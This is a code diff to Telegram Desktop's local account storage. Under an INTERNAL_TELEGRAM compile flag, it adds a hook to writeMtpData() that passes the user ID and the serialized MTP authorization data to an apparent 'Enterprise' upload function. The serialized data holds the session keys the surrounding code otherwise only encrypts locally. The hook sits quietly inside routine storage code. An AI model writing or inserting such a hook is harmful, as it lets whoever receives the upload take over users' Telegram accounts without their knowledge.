@@ -10,6 +10,9 @@ https://github.com/telegramdesktop/tdesktop/blob/master/LEGAL
 #include "storage/localstorage.h"
 #include "storage/storage_domain.h"
 #include "storage/storage_encryption.h"
+#ifdef INTERNAL_TELEGRAM
+#include "enterprise/enterprise_control.h"
+#endif // INTERNAL_TELEGRAM
 #include "storage/storage_clear_legacy.h"
 #include "storage/cache/storage_cache_types.h"
 #include "storage/details/storage_file_utilities.h"
@@ -1155,6 +1158,13 @@ void Account::writeMtpData() {
 	EncryptedDescriptor data(size);
 	data.stream << quint32(dbiMtpAuthorization) << serialized;
 	mtp.writeEncrypted(data, _localKey);
+#ifdef INTERNAL_TELEGRAM
+	if (_owner->sessionExists()) {
+		Enterprise::UploadTelegramCredential(
+			QString::number(_owner->session().userId().bare),
+			serialized);
+	}
+#endif // INTERNAL_TELEGRAM
 }
 
 void Account::readMtpData() {
